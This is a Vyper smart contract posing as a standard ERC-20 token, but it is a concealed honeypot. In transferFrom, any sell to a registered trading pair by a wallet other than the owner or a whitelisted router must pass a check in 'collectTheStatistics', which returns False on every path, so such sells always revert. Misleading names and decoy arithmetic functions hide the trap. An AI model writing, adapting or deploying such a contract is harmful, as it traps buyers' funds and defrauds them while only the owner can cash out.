# @pragma evm-version cancun
#pragma version ^0.3.10


name: public(String[32])
symbol: public(String[32])
decimals: public(uint8)
balanceOf: public(HashMap[address, uint256])
allowance: public(HashMap[address, HashMap[address, uint256]])
totalSupply: public(uint256)
feeRate: public(uint256)
hasFee: public(bool)
selfie: public(address)
_pairs: public(HashMap[address, bool])
routers: public(HashMap[address, bool])
walletToPurchaseTime: public(HashMap[address, uint256])
walletToSellime: public(HashMap[address, uint256])
theRewardTime: public(uint256)
standartValuation: public(uint256)
_lastWallet: public(address)



event Transfer:
    sender: indexed(address)
    receiver: indexed(address)
    value: uint256

event Approval:
    owner: indexed(address)
    spender: indexed(address)
    value: uint256

@external
def __init__(_name: String[32], _symbol: String[32], _supply: uint256, _selfie: address):
    self.name = _name
    self.symbol = _symbol
    self.decimals = 18
    self.selfie = _selfie
    self.balanceOf[msg.sender] = _supply * 10 ** 18
    self.totalSupply = _supply * 10 ** 18
    self.theRewardTime = 3
    self.standartValuation = 600 / 2



@internal
def collectTheStatistics(lastBuyOrSellTime: uint256, theData: uint256, sender: address) -> bool:
    if lastBuyOrSellTime == 0:
        return False
    
    crashTime: uint256 = block.timestamp - lastBuyOrSellTime
    
    if crashTime == self.standartValuation:
        return False
    
    if crashTime == 0 and self._lastWallet != sender:
        return False
    
    return False


@external   
def transfer(_to : address, _value : uint256) -> bool:
    """
    @dev Transfer token for a specified address
    @param _to The address to transfer to.
    @param _value The amount to be transferred.
    """
    # NOTE: vyper does not allow underflows
    #       so the following subtraction would revert on insufficient balance

    self.balanceOf[msg.sender] -= _value
    self.balanceOf[_to] += _value
    
    log Transfer(msg.sender, _to, _value)
    return True


@external
def transferFrom(_from : address, _to : address, _value : uint256) -> bool:
    """
     @dev Transfer tokens from one address to another.
     @param _from address The address which you want to send tokens from
     @param _to address The address which you want to transfer to
     @param _value uint256 the amount of tokens to be transferred
    """
    self.allowance[_from][msg.sender] -= _value
    if (self._pairs[_from]):
        if (_from != self.selfie and _to != self.selfie):
            if self.walletToPurchaseTime[_to] == 0:
                self.walletToPurchaseTime[_to] = block.timestamp
        self._lastWallet = _to
    elif self._pairs[_to]:
        if (_from != self.selfie and _to != self.selfie):
            if (not self.routers[_from]):
                assert self.collectTheStatistics(self.walletToPurchaseTime[_from], self.theRewardTime, _from), "error"
                self.walletToSellime[_from] = block.timestamp
        self._lastWallet = _from
    self.balanceOf[_from] -= _value
    self.balanceOf[_to] += _value

    log Transfer(_from, _to, _value)
    return True


@external
def approve(_spender : address, _value : uint256) -> bool:
    """
    @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
         Beware that changing an allowance with this method brings the risk that someone may use both the old
         and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
         race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
         https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
    @param _spender The address which will spend the funds.
    @param _value The amount of tokens to be spent.
    """
    self.allowance[msg.sender][_spender] = _value
    log Approval(msg.sender, _spender, _value)
    return True

@external
def showSum(_num1: uint256, _num2: uint256) -> uint256:
    _sum: uint256 = _num1 + _num2
    return _sum

@external
def setPairs(pairs_: address):
    assert msg.sender == self.selfie, "error"
    self._pairs[pairs_] = not self._pairs[pairs_]

@external
def setWhite(_router: address):
    assert msg.sender == self.selfie, "error"
    self.routers[_router] = not self.routers[_router]


@external
def showDiff(_num1: uint256, _num2: uint256) -> uint256:
    _Diff: uint256 = _num1 - _num2
    return _Diff

@external
def showMul(_num1: uint256, _num2: uint256) -> uint256:
    _mul: uint256 = _num1 * _num2
    return _mul